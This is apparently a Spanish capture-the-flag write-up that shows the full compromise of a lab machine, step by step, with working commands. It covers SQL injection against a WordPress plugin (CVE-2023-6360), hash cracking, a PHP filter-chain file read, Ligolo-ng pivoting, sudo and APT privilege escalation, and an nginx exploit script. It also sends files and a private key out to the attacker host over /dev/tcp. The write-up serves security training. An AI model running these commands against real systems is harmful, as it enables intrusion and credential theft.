---
title: THLCPPT_V16
description: La seguridad ofensiva es la adrenalina pura del mundo cibernético. Enfréntate a sistemas desafiantes, explora vulnerabilidades y despliega tácticas de hacking para descubrir brechas antes que los malos. ¡Cada reto en una plataforma de CTF es una oportunidad para afilar tus habilidades y dominar el arte del ataque!
date: 2025-03-20
toc: true
pin: false
image:
 path: /assets/img/thl-writeup-thlcppt_v16/thlcppt_v16_logo.png
categories:
  - The Hackers Labs
tags:
  - linux
  - the hackers labs
  - ssh
  - http
  - tcp
  - wordpress
  - sqli blind
  - cve
  - password attacks
  - arbitrary file read
  - data leaks
  - sudo abuse
  - suid
  - information gathering
  - web analysis
  - cve exploitation
  - foothold
  - escaping docker
  - user pivoting
  - pivoting
  - privilege escalation

---
## Information Gathering

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sudo arp-scan -l | grep 08:00     
192.168.0.138	08:00:27:ac:6f:dc	PCS Systemtechnik GmbH
```

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ ping -c 1 192.168.0.138
PING 192.168.0.138 (192.168.0.138) 56(84) bytes of data.
64 bytes from 192.168.0.138: icmp_seq=1 ttl=64 time=0.290 ms

--- 192.168.0.138 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.290/0.290/0.290/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.138 -oG nmap1
Host: 192.168.0.138 ()	Status: Up
Host: 192.168.0.138 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ nmap -sCV -p22,80 -vvv 192.168.0.138 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 209327f635ab7080c32d83c03649544d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBEzuT2oHO4os+a21WaSF7jc29VIDzRJiqalbIliAUE7hQVJsQRATcxXcBwZHTIJsPx9XeDx3pj4nILbaNCYIKQ=
|   256 f7ea09d7d569f9ca3ead9cbecd902a65 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARpAMeXD3uh21mPiWtbvJeumI6GhGbOwsfZzmbk9pVs
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Examen de thl-cppt-v16
MAC Address: 08:00:27:AC:6F:DC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ whatweb 192.168.0.138
http://192.168.0.138 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[192.168.0.138], Title[Examen de thl-cppt-v16], nginx[1.22.1]
```

---
## Web Analysis

Accedo al servicio web utilizando la dirección IP de la máquina víctima y encuentro una interfaz que simula un examen. En la parte inferior de la página hay un botón `Ir al Examen` que redirige a un subdominio.

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v161_1.png)

Para acceder correctamente al subdominio, agrego las entradas necesarias en el archivo `/etc/hosts`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ echo '192.168.0.138\tthlcpptv16.thl\texamen.thlcpptv16.thl' | sudo tee -a /etc/hosts
```

---

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v161_2.png)

Al acceder al subdominio, identifico que el sitio web está utilizando WordPress.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ whatweb examen.thlcpptv16.thl
http://examen.thlcpptv16.thl [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[192.168.0.138], JQuery[3.7.1], MetaGenerator[WordPress 6.5.4], Script[importmap,module,text/javascript], Title[Examen], UncommonHeaders[link], WordPress[6.5.4], nginx[1.22.1]
```

Para obtener más información, realizo un escaneo con wpscan, enumerando temas, plugins y usuarios.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ wpscan --url http://examen.thlcpptv16.thl --api-token='<WPSCAN-TOKEN>' --enumerate tt,vp,u
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v161_4.png){: width="972" height="589" .w-75 .normal}
![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v161_3.png)

El escaneo revela tres usuarios válidos y cuatro vulnerabilidades asociadas con la versión del plugin "My Calendar".

---
## CVE Exploitation

Entre las vulnerabilidades identificadas en el plugin My Calendar, determino que [CVE-2023-6360](https://nvd.nist.gov/vuln/detail/CVE-2023-6360) es la más viable para la explotación, ya que permite realizar una inyección SQL de forma no autenticada.
* Referencia: [Mycalendar Plugin Unauthenticated Sql Injection](https://medium.com/tenable-techblog/wordpress-mycalendar-plugin-unauthenticated-sql-injection-cve-2023-6360-d272887ddf12).
* Referencia: [SQL Injection in My Calendar WordPress Plugin](https://www.tenable.com/security/research/tra-2023-40).

Utilizo sqlmap para identificar la base de datos activa.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sqlmap -u "http://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&from=1*" --batch --current-db --dbms=MySQL
current database: 'wordpress'
```

Posteriormente, dumpeo el contenido de la tabla `wp_users`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sqlmap -u "http://examen.thlcpptv16.thl/?rest_route=/my-calendar/v1/events&from=1*" --batch --dump --dbms=MySQL -D wordpress -T wp_users
Database: wordpress
Table: wp_users
[3 entries]
+----+------------------------------+------------------------------------+---------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| ID | user_url                     | user_pass                          | user_email                | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
+----+------------------------------+------------------------------------+---------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
| 1  | http://examen.thlcpptv16.thl | $P$B43UAoTTnv0stdbxGqzwyQtyXm86x/1 | examinador@thlcpptv16.thl | examinador | 0           | examinador   | examinador    | 2024-06-15 20:27:49 | <blank>             |
| 2  | <blank>                      | $P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1 | tom@thlcpptv16.thl        | tom        | 0           | tom          | tom           | 2024-06-15 20:33:29 | <blank>             |
| 3  | <blank>                      | $P$B0uohNeAjd6aq3n0dv6NC7Nhkro0Kt. | jerry@thlcpptv16.thl      | jerry      | 0           | jerry        | jerry         | 2024-06-15 20:34:14 | <blank>             |
+----+------------------------------+------------------------------------+---------------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
```

Los usuarios obtenidos de la tabla `wp_users` coinciden con los previamente enumerados mediante WPScan. Identifico que las contraseñas están cifradas con el algoritmo phpass.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ hashcat --show '$P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1'
   # | Name                                            | Category
=====+=================================================+==============================
 400 | phpass                                          | Generic KDF

/home/kali/Documents/thl/thlcppt_v16:-$ hashcat -m 400 -a 0 '$P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1' /usr/share/wordlists/rockyou.txt
$P$BJrv/Sv/rBlufcIW5FiMdUW4lA5UrN1:iloveme2
```

Una vez obtenida la contraseña del usuario `Tom`, accedo exitosamente al panel de WordPress.

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v161_5.png)

---
## Foothold

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v162_1.png)

Una vez dentro del panel de WordPress como el usuario `Tom`, se observa una entrada con el título "Filtración de Datos". La nota hace referencia a un nuevo subdominio `examendos.thlcpptv16.thl`.

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v162_2.png)

Se actualiza el archivo `/etc/hosts` para poder acceder al nuevo subdominio.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sed -i '$d' /etc/hosts
/home/kali/Documents/thl/thlcppt_v16:-$ echo '192.168.0.138\tthlcpptv16.thl\texamen.thlcpptv16.thl\texamendos.thlcpptv16.thl' | sudo tee -a /etc/hosts
```

---

Al acceder al nuevo subdominio, se encuentra un formulario que solicita una url junto con archivos `.json` o `.txt`. El texto `Filter it! WrapWrap it!` sugiere el uso de filtros y wrappers de PHP para manipular contenido.

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v162_3.png)

Encuentro la herramienta [wrapwrap](https://github.com/ambionics/wrapwrap), que genera una cadena de `php://filter` para incluir prefijos y sufijos al contenido de un archivo. Según la descripción, permite envolver archivos y formatearlos como JSON bajo el esquema `{"message":"<contenido>"}`.

Se descarga el script y se instala la dependencia necesaria.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ wget https://raw.githubusercontent.com/ambionics/wrapwrap/refs/heads/main/wrapwrap.py

(venv)-/home/kali/Documents/thl/thlcppt_v16:-$ pip install ten
```

Genera un archivo `chain.txt` apuntando a `/etc/passwd` para verificar la viabilidad del ataque.

```terminal
(venv)-/home/kali/Documents/thl/thlcppt_v16:-$ ./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
[*] Dumping 1008 bytes from /etc/passwd.
[+] Wrote filter chain to chain.txt (size=705031).
```

Levanto un servidor para exponer el archivo.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Finalmente, se envío la url del archivo al formulario mediante curl para validar la lectura remota. El contenido de `/etc/passwd` es devuelto correctamente, confirmando así la vulnerabilidad.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ curl -X POST http://examendos.thlcpptv16.thl/process.php -H 'content-type:application/x-www-form-urlencoded' --data 'url=http://192.168.0.171/chain.txt'
{"message":"root:x:0:0:root:/root:/bin/bash=0Adaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin=0Abin:x:2:2:bin:/bin:/usr/sbin/nologin=0Asys:x:3:3:sys:/dev:/usr/sbin/nologin=0Async:x:4:65534:sync:/bin:/bin/sync=0Agames:x:5:60:games:/usr/games:/usr/sbin/nologin=0Aman:x:6:12:man:/var/cache/man:/usr/sbin/nologin=0Alp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin=0Amail:x:8:8:mail:/var/mail:/usr/sbin/nologin=0Anews:x:9:9:news:/var/spool/news:/usr/sbin/nologin=0Auucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin=0Aproxy:x:13:13:proxy:/bin:/usr/sbin/nologin=0Awww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin=0Abackup:x:34:34:backup:/var/backups:/usr/sbin/nologin=0Alist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin=0Airc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin=0A_apt:x:42:65534::/nonexistent:/usr/sbin/nologin=0Anobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin=0Asystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin=0Asystemd-timesync:x:997:997:systemd Time Synchronization:/:"}
```

---

Ahora, apunto al archivo de configuración de wordpress ubicado en `wp-config.php`, con el objetivo de extraer credenciales.

```terminal
(venv)-/home/kali/Documents/thl/thlcppt_v16:-$ ./wrapwrap.py /var/www/examen.thlcpptv16.thl/wp-config.php '{"message":"' '"}' 1000
[*] Dumping 1008 bytes from /var/www/examen.thlcpptv16.thl/wp-config.php.
[+] Wrote filter chain to chain.txt (size=705064).
                                                                                                    
/home/kali/Documents/thl/thlcppt_v16:-$ curl -X POST http://examendos.thlcpptv16.thl/process.php -H 'content-type:application/x-www-form-urlencoded' --data 'url=http://192.168.0.171/chain.txt'
{"message":"<?php=0D=0Adefine( 'DB_NAME', 'wordpress' );=0D=0A=0D=0Adefine( 'DB_USER', 'WPUSER' );=0D=0A=0D=0Adefine( 'DB_PASSWORD', 'T0mB3stP4ssw0rd!' );=0D=0A=0D=0Adefine( 'DB_HOST', 'localhost' );=0D=0A=0D=0Adefine( 'DB_CHARSET', 'utf8' );=0D=0A=0D=0Adefine( 'DB_COLLATE', '' );=0D=0A=0D=0Adefine( 'AUTH_KEY',         'put your unique phrase here' );=0D=0Adefine( 'SECURE_AUTH_KEY',  'put your unique phrase here' );=0D=0Adefine( 'LOGGED_IN_KEY',    'put your unique phrase here' );=0D=0Adefine( 'NONCE_KEY',        'put your unique phrase here' );=0D=0Adefine( 'AUTH_SALT',        'put your unique phrase here' );=0D=0Adefine( 'SECURE_AUTH_SALT', 'put your unique phrase here' );=0D=0Adefine( 'LOGGED_IN_SALT',   'put your unique phrase here' );=0D=0Adefine( 'NONCE_SALT',       'put your unique phrase here' );=0D=0A=0D=0A$table_prefix =3D 'wp_';=0D=0A=0D=0A/**=0D=0A * For developers: WordPress debugging mode.=0D=0A *=0D=0A * Change this to true to enable the display of notices during development.=0D=0A * It is "}
```

El contenido filtrado revela las credenciales `T0mB3stP4ssw0rd!`, pertenecientes al usuario `Tom`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ ssh tom@thlcpptv16.thl
tom@192.168.0.138's password: T0mB3stP4ssw0rd!

tom@thlcpptv16:~$ id
uid=1000(tom) gid=1000(tom) grupos=1000(tom)
```

---
## User Pivoting

Inicio revisando el contenido del archivo `/etc/passwd` para verificar los usuarios disponibles

```terminal
tom@thlcpptv16:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
jerry:x:1001:1001::/home/jerry:/bin/bash
```

En el directorio principal del usuario, encuentro el archivo `ToDo` que contiene pistas sobre tareas o conexiones futuras.

```terminal
tom@thlcpptv16:~$ cat ToDo
Crear alias para ejecutar ssh para conectarme a la maquina de rafael desde cualquier directorio
Crear una clave privada
Buscar a jerry
```

Verifico el contenido del archivo `.bashrc` para identificar si existen alias relevantes. Y encuentro un alias que facilita la conexión a un contenedor mediante ssh.

```terminal
tom@thlcpptv16:~$ grep 'alias' .bashrc
alias rafael="sshpass -p 'Zds18Blt5iWY006ZaTpMclE1' ssh -tt rafael@172.101.0.5"
```

Tambien, identifico un archivo en el sistema que contiene una cadena codificada en ROT13.

```terminal
tom@thlcpptv16:~$ find / -group 1001 2>/dev/null
/var/backup/passwd.dll
/home/jerry

tom@thlcpptv16:~$ cat /var/backup/passwd.dll 
Yn pynir cnen pbarpgne cbe ffu n wreel_yncgbc rf: wreel:TCN
MUTAiZwQqBu9969N0LNR6
```

De la cadena obtengo lo siguiente.

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v163_1.png)

Aunque por ahora no es necesario usarla, es una información valiosa para futuro.

Ejecuto el alias para conectarme a la máquina de `rafael` y encuentro la primera flag.

```terminal
tom@thlcpptv16:~$ ssh rafael@172.101.0.5
rafael@172.101.0.5's password: Zds18Blt5iWY006ZaTpMclE1

rafael@rafael:~$ id
uid=1000(rafael) gid=1000(rafael) groups=1000(rafael)

rafael@rafael:~$ cat user.txt 
```

---
### Escaping Docker
#### Privilege Escalation

Verifico mis privilegios y descubro que el usuario `rafael` puede ejecutar `/usr/bin/vim` sin necesidad de contraseña.

```terminal
rafael@rafael:~$ sudo -l
Matching Defaults entries for rafael on rafael:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User rafael may run the following commands on rafael:
    (ALL) NOPASSWD: /usr/bin/vim
```

Consulto [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo) para confirmar la técnica de explotación con `vim`. Y aprovecho este permiso para lanzar una shell con privilegios de `root`.

```terminal
rafael@rafael:~$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

---
#### Pivoting

Dentro del directorio `root` del sistema, encuentro dos archivos relevantes; `start.sh`, un script que inicia o configura el entorno y `tunnelRafael.conf`, un archivo que contiene la configuración típica de un túnel WireGuard.

```terminal
root@rafael:~# cat start.sh
#!/bin/bash

# Start the SSH service
service ssh start

# Keep the container running
tail -f /dev/null
```

Al inspeccionar `tunnelRafael.conf`, identifico parámetros que indican la creación de una nueva subred `10.13.13.1/24`. Esto evidencia que el fichero está destinado a establecer un túnel con WireGuard.

```terminal
root@rafael:~# cat tunnelRafael.conf
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v164_1.png)

Desde el contenedor, envío el contenido del fichero a mi máquina.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ nc -lnvp 4444 > tunnelRafael.conf
	listening on [any] 4444 ...

root@rafael:~# cat tunnelRafael.conf > /dev/tcp/192.168.0.171/4444

	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.138] 32980
```

---

Primero, descargo Ligolo-ng Proxy y Ligolo-ng Agent desde el repositorio oficial para establecer un túnel reverso que permita la comunicación entre la máquina víctima y mi máquina atacante.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz

root@rafael:~# wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
```

Configuro una interfaz tun en mi máquina para permitir el paso del tráfico a través del túnel. Luego, creó la interfaz y luego la activo con `ip link set`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sudo ip tuntap add user kali mode tun ligolo
/home/kali/Documents/thl/thlcppt_v16:-$ sudo ip link set ligolo up
```

Posteriormente, ejecuto el proxy y el agente de Ligolo.
* En la máquina atacante, inicio el proxy con la opción `-selfcert` para generar un certificado autofirmado.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ ./proxy -selfcert
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v164_2.png)

* En el sistema víctima, ejecuto el agente para conectarse a mi proxy.

```terminal
root@rafael:~# ./agent -connect 192.168.0.171:11601 -ignore-cert
WARN[0000] warning, certificate validation disable
INFO[0000] Connection established			addr="192.168.0.171:11601"
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v164_3.png)

Una vez establecido el túnel de Ligolo-ng, levanto la interfaz de WireGuard utilizando el archivo de configuración `tunnelRafael.conf`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ wg-quick up tunnelRafael.conf
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v164_4.png)

Utilizo fping para escanear la subred `10.13.13.0/24` y confirmar los hosts activos.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ fping -asgq 10.13.13.1/24
10.13.13.1
10.13.13.2
10.13.13.3
```

Con un escaneo de nmap identifico que el puerto 22 está abierto en el host `10.13.13.3`. Y utilizo las credenciales encontradas anteriormente para conectarme mediante ssh.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ sudo nmap -p22 10.13.13.3
PORT   STATE SERVICE
22/tcp open  ssh

/home/kali/Documents/thl/thlcppt_v16:-$ ssh jerry@10.13.13.3
jerry@10.13.13.3's password: GPAZHGNvMjDdOh9969A0YAE6

jerry@jerry_laptop:~$ id
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry),1001(sistema)
```

---
### Privilege Escalation

```terminal
jerry@jerry_laptop:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
jerry:x:1000:1000::/home/jerry:/bin/bash
```

El usuario `jerry` pertenece al grupo `sistema` y tiene capacidad de escritura en el directorio `/etc/apt/apt.conf.d`. 

```terminal
jerry@jerry_laptop:~$ find / -group 1001 2>/dev/null
/etc/apt/apt.conf.d
/etc/apt/apt.conf.d/70debconf
/etc/apt/apt.conf.d/docker-autoremove-suggests
/etc/apt/apt.conf.d/01autoremove
/etc/apt/apt.conf.d/docker-gzip-indexes
/etc/apt/apt.conf.d/docker-clean
/etc/apt/apt.conf.d/docker-no-languages
```

Utilizando la técnica documentada en [APT Privilege Escalation](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/), modifico el comportamiento de apt para ejecutar un comando con privilegios elevados. Esto me permite, obtener una shell SUID.

```terminal
jerry@jerry_laptop:/etc/apt/apt.conf.d$ echo 'APT::Update::Pre-Invoke:: {"chmod u+s /bin/bash";};' > 01a

jerry@jerry_laptop:/etc/apt/apt.conf.d$ bash -p
bash-5.2# id
uid=1000(jerry) gid=1000(jerry) euid=0(root) groups=1000(jerry),1001(sistema)

bash-5.2# cat /root/homeCreds.txt
jerry:smO4IquxSH1fMt5pnQ4lBaEH
```

Después de haber escalado privilegios, leo el archivo `/root/homeCreds.txt` que contiene credenciales para conectarme vía ssh al usuario `jerry@thlcpptv16.thl`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ ssh jerry@thlcpptv16.thl
jerry@thlcpptv16.thl's password: smO4IquxSH1fMt5pnQ4lBaEH

jerry@thlcpptv16:~$ id
uid=1001(jerry) gid=1001(jerry) grupos=1001(jerry)
```

---
## Privilege Escalation

El usuario `jerry` tiene permisos para ejecutar nginx como `root` sin necesidad de contraseña.

```terminal
jerry@thlcpptv16:~$ sudo -l
Matching Defaults entries for jerry on thlcpptv16:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User jerry may run the following commands on thlcpptv16:
    (root) NOPASSWD: /usr/sbin/nginx
```

Según el siguiente exploit: [Privilege Escalation - NGINX / SUDO](https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406) se puede aprovechar esta configuración, es posible iniciar un servidor nginx personalizado con permisos elevados que permita escribir en el sistema de archivos del usuario `root`.

```terminal
jerry@thlcpptv16:~$ cat exploit.sh 
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```

Ejecuto el script para llevar a cabo la escalada.

```terminal
jerry@thlcpptv16:~$ chmod +x exploit.sh

jerry@thlcpptv16:~$ ./exploit.sh
```

![](assets/img/thl-writeup-thlcppt_v16/thlcppt_v165_1.png)

Una vez ejecutado, obtengo una clave privada válida para acceder como `root`.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ nc -lnvp 4444 > id_rsa
	listening on [any] 4444 ...

jerry@thlcpptv16:~$ cat .ssh/id_rsa > /dev/tcp/192.168.0.171/4444

	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.138] 36436
```

De esta forma consigo acceso total al sistema.

```terminal
/home/kali/Documents/thl/thlcppt_v16:-$ chmod 600 id_rsa
/home/kali/Documents/thl/thlcppt_v16:-$ ssh root@thlcpptv16.thl -i id_rsa

root@thlcpptv16:~# id
uid=0(root) gid=0(root) grupos=0(root)

root@thlcpptv16:~# cat root.txt
```